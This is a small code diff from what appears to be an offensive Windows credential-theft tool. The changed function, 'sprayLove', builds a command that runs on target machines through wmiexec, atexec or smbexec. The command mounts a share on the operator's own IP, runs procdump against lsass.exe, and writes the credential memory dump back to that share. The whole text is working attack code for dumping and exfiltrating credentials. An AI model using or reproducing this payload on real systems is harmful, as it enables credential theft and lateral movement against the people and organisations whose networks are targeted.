@@ -17,9 +17,9 @@ from core.Colors import *
 def sprayLove(user, target, methods, share, port=80):
 	if not methods : methods = ['wmiexec', 'atexec', 'smbexec']
 	smb_share_name = gen_random_string(5)
-	
+
 	local_ip = retrieveMyIP()
-	payload = "net use \\\\%s@%s\\misc\\ & \\\\%s@%s\\misc\\procdump\\procdump64.exe -accepteula -ma lsass.exe \\\\%s@%s\\misc\\dumps\\%s.dmp" % (local_ip, port, local_ip, port, local_ip, port, target)
+	payload = "pushd \\\\%s@%s\\misc & procdump\\procdump64.exe -accepteula -ma lsass.exe dumps\\%s.dmp & echo 'TOTHEMOON'" % (local_ip, port, target)
 	exec_method = None
 
 	for method in methods:
